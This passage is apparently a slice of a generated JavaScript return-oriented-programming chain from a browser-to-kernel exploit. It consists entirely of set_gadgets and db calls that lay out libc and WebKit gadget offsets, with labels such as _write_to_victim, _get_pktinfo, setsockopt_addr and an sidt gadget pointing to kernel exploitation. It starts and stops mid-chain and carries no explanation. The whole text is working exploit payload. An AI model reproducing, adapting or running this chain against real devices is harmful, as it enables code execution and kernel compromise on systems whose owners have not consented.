db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+363064,//L6806
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6804:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L6806:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+363152,//L6808
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+363168,//L6809
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6808:
db([0,0]);
set_gadget(libc_base+772328,);
//L6809:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+363312,//L6812
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+363280,//L6810
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+363296,//L6811
webkit_base+4687784,
libc_base+165442
]);
//L6810:
db([0,0]);
set_gadget(libc_base+772328,);
//L6811:
db([0,0]);
set_gadget(libc_base+768796,);
//L6812:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L6814:
ropchain+363416,//L6813
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+339256,//_write_to_victim
//L6813:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+363504,//L6816
webkit_base+4687784,
libc_base+713278
]);
//L6815:
db([4294967276,4294967295]);// -0x14
set_gadget(libc_base+768796,);
//L6816:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+363608,//L6819
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6817:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L6819:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+363696,//L6821
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+363712,//L6822
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6821:
db([0,0]);
set_gadget(libc_base+772328,);
//L6822:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+363872,//L6824
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+363904,//L6826
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+363856,//L6823
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+363888,//L6825
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6823:
db([0,0]);
set_gadget(libc_base+165442,);
//L6824:
db([0,0]);
set_gadget(libc_base+772328,);
//L6825:
db([0,0]);
set_gadget(libc_base+768796,);
//L6826:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+364000,//L6828
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+363984,//L6827
webkit_base+4687784,
libc_base+165442
]);
//L6827:
db([0,0]);
set_gadget(libc_base+768796,);
//L6828:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L6830:
ropchain+364104,//L6829
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+196160,//_get_pktinfo
//L6829:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+364192,//L6833
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6831:
db([40,0]);// 0x28
set_gadget(libc_base+772328,);
//L6833:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+364280,//L6835
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+364296,//L6836
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6835:
db([0,0]);
set_gadget(libc_base+772328,);
//L6836:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+364440,//L6839
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+364408,//L6837
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+364424,//L6838
webkit_base+4687784,
libc_base+165442
]);
//L6837:
db([0,0]);
set_gadget(libc_base+772328,);
//L6838:
db([0,0]);
set_gadget(libc_base+768796,);
//L6839:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+364536,//L6841
webkit_base+4687784,
libc_base+713278
]);
//L6840:
db([4294967276,4294967295]);// -0x14
set_gadget(libc_base+768796,);
//L6841:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+364592,//L6843
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6843:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+364648,//L6845
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6845:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+364752,//L6848
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6846:
db([32,0]);// 0x20
set_gadget(libc_base+772328,);
//L6848:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+364840,//L6850
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+364856,//L6851
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6850:
db([0,0]);
set_gadget(libc_base+772328,);
//L6851:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+365000,//L6854
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+364968,//L6852
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+364984,//L6853
webkit_base+4687784,
libc_base+165442
]);
//L6852:
db([0,0]);
set_gadget(libc_base+772328,);
//L6853:
db([0,0]);
set_gadget(libc_base+768796,);
//L6854:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+365096,//L6857
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6855:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L6857:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+365184,//L6859
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+365200,//L6860
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6859:
db([0,0]);
set_gadget(libc_base+772328,);
//L6860:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+365344,//L6863
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+365312,//L6861
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+365328,//L6862
webkit_base+4687784,
libc_base+165442
]);
//L6861:
db([0,0]);
set_gadget(libc_base+772328,);
//L6862:
db([0,0]);
set_gadget(libc_base+768796,);
//L6863:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L6865:
ropchain+365448,//L6864
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+339256,//_write_to_victim
//L6864:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796
]);
//L6866:
db([20,0]);// 0x14
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+365584,//L6868
webkit_base+4687784,
libc_base+713278
]);
//L6867:
db([4294967276,4294967295]);// -0x14
set_gadget(libc_base+768796,);
//L6868:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L6869:
db([46,0]);// 0x2e
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L6870:
db([41,0]);// 0x29
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+365784,//L6873
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6871:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L6873:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+365872,//L6875
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+365888,//L6876
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L6875:
db([0,0]);
set_gadget(libc_base+772328,);
//L6876:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+366048,//L6878
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+366080,//L6880
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+366032,//L6877
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+366064,//L6879
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6877:
db([0,0]);
set_gadget(libc_base+165442,);
//L6878:
db([0,0]);
set_gadget(libc_base+772328,);
//L6879:
db([0,0]);
set_gadget(libc_base+768796,);
//L6880:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+366176,//L6882
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+366160,//L6881
webkit_base+4687784,
libc_base+165442
]);
//L6881:
db([0,0]);
set_gadget(libc_base+768796,);
//L6882:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L6884:
ropchain+366280,//L6883
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+367520,//L6885
//L6883:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+366424,//L6887
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+366440,//L6888
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+366408,//L6886
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6886:
db([0,0]);
set_gadget(libc_base+165442,);
//L6887:
db([0,0]);
set_gadget(libc_base+768796,);
//L6888:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+366568,//L6891
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+366600,//L6893
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+366584,//L6892
webkit_base+4687784,
libc_base+713278
]);
//L6890:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L6891:
db([0,0]);
set_gadget(libc_base+165442,);
//L6892:
db([0,0]);
set_gadget(libc_base+768796,);
//L6893:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+366712,//L6894+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+366704,//L6894
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L6894:
db([0,0]);
set_gadgets([
ropchain+366728,//L6894+24
ropchain+367192,//L6889
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+366800,//L6897
webkit_base+4687784,
libc_base+768796
]);
//L6895:
db([0,0]);
set_gadget(libc_base+165442,);
//L6896:
db([0,0]);
set_gadget(libc_base+772328,);
//L6897:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+366960,//L6899
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+366992,//L6901
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+366944,//L6898
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+366976,//L6900
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6898:
db([0,0]);
set_gadget(libc_base+165442,);
//L6899:
db([0,0]);
set_gadget(libc_base+772328,);
//L6900:
db([0,0]);
set_gadget(libc_base+768796,);
//L6901:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+367072,//L6902
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+367088,//L6903
webkit_base+4687784,
libc_base+165442
]);
//L6902:
db([0,0]);
set_gadget(libc_base+768796,);
//L6903:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+367184,//L6905
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+367168,//L6904
webkit_base+4687784,
libc_base+165442
]);
//L6904:
db([0,0]);
set_gadget(libc_base+768796,);
//L6905:
db([0,0]);
//L6889:
set_gadgets([
libc_base+713278,
ropchain+367272,//L6907
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+367256,//L6906
webkit_base+4687784,
libc_base+165442
]);
//L6906:
db([0,0]);
set_gadget(libc_base+768796,);
//L6907:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+367376,//L6908
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+367392,//L6909
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L6908:
db([0,0]);
set_gadget(libc_base+768796,);
//L6909:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+367512,//L6910
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+367496,//L6911
webkit_base+4687784,
libc_base+768796
]);
//L6911:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L6910:
db([0,0]);
//L6885:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+11,//nop
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
webkit_base+4687784,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+489696,//pop rsp
libc_base+430587,
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967080,4294967295]);// -0xd8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([200,0]);// 0xc8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967088,4294967295]);// -0xd0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([192,0]);// 0xc0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967096,4294967295]);// -0xc8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([184,0]);// 0xb8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967104,4294967295]);// -0xc0
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([176,0]);// 0xb0
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967112,4294967295]);// -0xb8
set_gadgets([
libc_base+207036,
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([168,0]);// 0xa8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+772328
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
webkit_base+5236215,//and rax,rcx
libc_base+772328,
setsockopt_addr,
webkit_base+2989859,//mov [rax],rcx
libc_base+713278
]);
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([48,0]);
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+430587,
libc_base+713278
]);
db([32,0]);// 0x20
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278
]);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+368840,//L6912
webkit_base+4687784,
libc_base+489696 //pop rsp
]);
//L6912:
db([0,0]);
//_sidt:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+368912,//L6914
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L6914:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+368976,//L6916
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L6916:
db([0,0]);
set_gadget(libc_base+713278,);
db([128,0]);// 0x80
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6917:
db([4294967168,4294967295]);// -0x80
set_gadgets([
libc_base+772328,
//L6919:
libc_base+149872,//mov rax,[rdi]
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6920:
db([4294967176,4294967295]);// -0x78
set_gadgets([
libc_base+772328,
//L6922:
libc_base+713278,
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+713278,
ropchain+369176,//L6925
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6923:
db([4294967168,4294967295]);// -0x80
set_gadget(libc_base+772328,);
//L6925:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+369256,//L6927
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6927:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+369312,//L6929
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6929:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+369408,//L6931
webkit_base+4687784,
libc_base+768796
]);
//L6930:
db([13,0]);// 0xd
set_gadget(webkit_base+3789839,);//pop r11
//L6931:
db([0,0]);
set_gadget(libc_base+772328,);
//L6932:
db([8,0]);// 0x8
set_gadgets([
webkit_base+1537212,//imul rax,rcx
libc_base+713278,
ropchain+369504,//L6933
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+369520,//L6934
webkit_base+4687784,
libc_base+772328
]);
//L6933:
db([0,0]);
set_gadget(libc_base+768796,);
//L6934:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+369608,//L6936
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6936:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+369664,//L6938
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L6938:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+369752,//L6941
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6939:
db([4294967184,4294967295]);// -0x70
set_gadget(libc_base+772328,);
//L6941:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6942:
db([4294967192,4294967295]);// -0x68
set_gadgets([
libc_base+772328,
//L6944:
webkit_base+4687784,
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6945:
db([4294967200,4294967295]);// -0x60
set_gadgets([
libc_base+772328,
//L6947:
libc_base+713278,
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+713278,
ropchain+369952,//L6950
webkit_base+4687784,
libc_base+713278
]);
//L6948:
db([4294967295,4294967295]);// 0xffffffffffffffff
set_gadget(libc_base+768796,);
//L6949:
db([7,0]);// 0x7
set_gadget(libc_base+772328,);
//L6950:
db([0,0]);
set_gadgets([
libc_base+856504,//xor rax,rsi ;sub rax,rsi
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+370032,//L6953
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6951:
db([4294967208,4294967295]);// -0x58
set_gadget(libc_base+772328,);
//L6953:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6954:
db([4294967216,4294967295]);// -0x50
set_gadgets([
libc_base+772328,
//L6956:
libc_base+207036,
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6957:
db([4294967224,4294967295]);// -0x48
set_gadgets([
libc_base+772328,
//L6959:
libc_base+149872,//mov rax,[rdi]
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6960:
db([4294967232,4294967295]);// -0x40
set_gadgets([
libc_base+772328,
//L6962:
libc_base+772328,
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6963:
db([4294967240,4294967295]);// -0x38
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+370304,//L6966
webkit_base+4687784,
libc_base+772328
]);
//L6965:
db([125,0]);// 0x7d
set_gadget(libc_base+768796,);
//L6966:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6967:
db([4294967248,4294967295]);// -0x30
set_gadgets([
libc_base+772328,
//L6969:
libc_base+764700,//add rax,rcx
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6970:
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+772328,
//L6972:
webkit_base+829030,//sidt [rax-0x7d]
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6973:
db([4294967264,4294967295]);// -0x20
set_gadgets([
libc_base+772328,
//L6975:
libc_base+489696,//pop rsp
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6976:
db([4294967272,4294967295]);// -0x18
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+370568,//L6979
webkit_base+4687784,
libc_base+772328
]);
//L6978:
db([0,0]);
set_gadget(libc_base+768796,);
//L6979:
db([0,0]);
set_gadgets([
webkit_base+2989859,//mov [rax],rcx
libc_base+713278,
ropchain+370640,//L6982
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L6980:
db([4294967286,4294967295]);// -0xa
set_gadget(libc_base+772328,);
//L6982:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+370744,//L6984
webkit_base+4687784,
libc_base+713278
]);
//L6983:
db([4294967168,4294967295]);// -0x80
set_gadget(libc_base+768796,);
//L6984:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+370792,//L6986
webkit_base+4687784,
webkit_base+12069057 //pop r10
]);
//L6986:
db([0,0]);
set_gadgets([
libc_base+768796,
//L6987:
ropchain+370936,//L6985
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+370912,//L6989
webkit_base+4687784,
webkit_base+2799478,//mov rax,r10
libc_base+713278,
ropchain+370928,//L6988
webkit_base+4687784,
libc_base+768796
]);
//L6989:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L6988:
db([0,0]);
//L6985:
set_gadgets([
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+371024,//L6991
webkit_base+4687784,
libc_base+713278
]);
//L6990:
db([4294967286,4294967295]);// -0xa
set_gadget(libc_base+768796,);
//L6991:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+371136,//L6992
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+371168,//L6994
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+371152,//L6993
webkit_base+4687784,
libc_base+165442
]);
//L6992:
db([0,0]);
set_gadget(libc_base+772328,);
//L6993:
db([0,0]);
set_gadget(libc_base+768796,);
//L6994:
db([0,0]);
set_gadgets([
libc_base+229840,//mov ax,[rdi]
libc_base+713278,
ropchain+371328,//L6998
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+371280,//L6995
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+371296,//L6996
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L6995:
db([0,0]);
